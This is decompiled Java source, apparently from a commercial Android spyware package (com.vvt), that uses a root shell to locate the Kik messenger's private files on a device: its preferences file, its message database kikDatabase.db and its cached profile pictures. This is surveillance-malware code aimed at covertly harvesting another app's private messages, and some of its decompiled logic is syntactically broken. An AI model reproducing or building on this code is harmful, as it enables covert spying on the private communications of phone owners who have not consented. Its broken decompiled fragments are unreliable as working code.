package com.vvt.n.a.c;

import com.vvt.ag.b;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static String a()
  {
    int i = 3;
    Object localObject = null;
    int j = 2;
    int k = 1;
    boolean bool1 = false;
    String str1 = null;
    String[] arrayOfString = new String[j];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[k] = "kik.android";
    arrayOfObject[j] = "shared_prefs";
    String str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[k] = "kik.android";
    String str3 = "shared_prefs";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[k] = str2;
    int n = arrayOfString.length;
    int i1 = 0;
    str2 = null;
    if (i1 < n)
    {
      str1 = arrayOfString[i1];
      boolean bool3 = ShellUtil.b(str1);
      if (!bool3) {}
    }
    for (;;)
    {
      boolean bool2 = b.a(str1);
      if (!bool2)
      {
        str2 = a(str1, "KikPreferences.xml");
        str1 = p.a(str1, str2);
        bool2 = ShellUtil.b(str1);
        if (bool2) {
          break label206;
        }
      }
      for (;;)
      {
        bool1 = b;
        if (bool1) {}
        return (String)localObject;
        m = bool2 + true;
        bool2 = m;
        break;
        label206:
        localObject = str1;
      }
      int m = 0;
      str1 = null;
    }
  }
  
  public static String a(String paramString)
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[k];
    Object[] arrayOfObject = new Object[5];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[m] = "kik.android";
    arrayOfObject[k] = "cache";
    arrayOfObject[j] = "profPics";
    arrayOfObject[i] = paramString;
    String str2 = String.format("%s/%s/%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[5];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[m] = "kik.android";
    arrayOfObject[k] = "cache";
    String str3 = "profPics";
    arrayOfObject[j] = str3;
    arrayOfObject[i] = paramString;
    str2 = String.format("%s/%s/%s/%s/%s", arrayOfObject);
    arrayOfString[m] = str2;
    int i1 = arrayOfString.length;
    int i2 = 0;
    str2 = null;
    if (i2 < i1)
    {
      str1 = arrayOfString[i2];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      n = i2 + 1;
      i2 = n;
      break;
      n = 0;
      str1 = null;
    }
  }
  
  public static String a(String paramString1, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    boolean bool2 = false;
    Object localObject1 = new java/io/File;
    ((File)localObject1).<init>(paramString1);
    boolean bool3 = ((File)localObject1).exists();
    if (bool3)
    {
      bool1 = ((File)localObject1).isDirectory();
      if (bool1)
      {
        bool1 = true;
        localObject1 = LinuxFile.a(paramString1, bool1);
        if (localObject1 != null)
        {
          int i = ((ArrayList)localObject1).size();
          if (i > 0)
          {
            Object localObject2 = new java/lang/StringBuilder;
            ((StringBuilder)localObject2).<init>();
            localObject2 = Pattern.compile("(" + paramString2 + ")$");
            Iterator localIterator = ((ArrayList)localObject1).iterator();
            boolean bool4;
            do
            {
              bool1 = localIterator.hasNext();
              if (!bool1) {
                break;
              }
              localObject1 = (LinuxFile)localIterator.next();
              Object localObject3 = ((LinuxFile)localObject1).d();
              localObject3 = ((Pattern)localObject2).matcher((CharSequence)localObject3);
              bool4 = ((Matcher)localObject3).find();
            } while (!bool4);
          }
        }
      }
    }
    for (localObject1 = ((LinuxFile)localObject1).d();; localObject1 = null)
    {
      bool2 = b;
      if (bool2) {}
      return (String)localObject1;
      bool1 = false;
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    Object localObject = null;
    String str1 = "No such file or directory";
    for (;;)
    {
      try
      {
        bool1 = ShellUtil.b(paramString2);
        if (!bool1) {
          continue;
        }
        String str2 = "%s find %s -name \"%s\"";
        int i = 3;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString1;
        j = 1;
        arrayOfObject[j] = paramString2;
        j = 2;
        arrayOfObject[j] = paramString3;
        str2 = String.format(str2, arrayOfObject);
        str2 = KMShell.a(str2);
        boolean bool2 = b;
        if ((!bool2) || (str2 != null))
        {
          boolean bool3 = str2.equalsIgnoreCase(str1);
          if (!bool3) {
            localObject = str2;
          }
        }
        bool1 = b;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        boolean bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      return (String)localObject;
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public static String b()
  {
    int i = 3;
    Object localObject = null;
    int j = 2;
    int k = 1;
    boolean bool1 = false;
    String str1 = null;
    String[] arrayOfString = new String[j];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[k] = "kik.android";
    arrayOfObject[j] = "databases";
    String str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[k] = "kik.android";
    String str3 = "databases";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[k] = str2;
    int n = arrayOfString.length;
    int i1 = 0;
    str2 = null;
    if (i1 < n)
    {
      str1 = arrayOfString[i1];
      boolean bool3 = ShellUtil.b(str1);
      if (!bool3) {}
    }
    for (;;)
    {
      boolean bool2 = b.a(str1);
      if (!bool2)
      {
        str2 = b(str1);
        boolean bool4 = b.a(str2);
        if (!bool4)
        {
          str1 = p.a(str1, str2);
          bool2 = ShellUtil.b(str1);
          if (bool2) {
            break label216;
          }
        }
      }
      for (;;)
      {
        bool1 = b;
        if (bool1) {}
        return (String)localObject;
        m = bool2 + true;
        bool2 = m;
        break;
        label216:
        localObject = str1;
      }
      int m = 0;
      str1 = null;
    }
  }
  
  public static String b(String paramString)
  {
    String str = a(paramString, "kikDatabase.db");
    boolean bool = b;
    if (bool) {}
    return str;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/MyUncaughtExceptionHandler/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */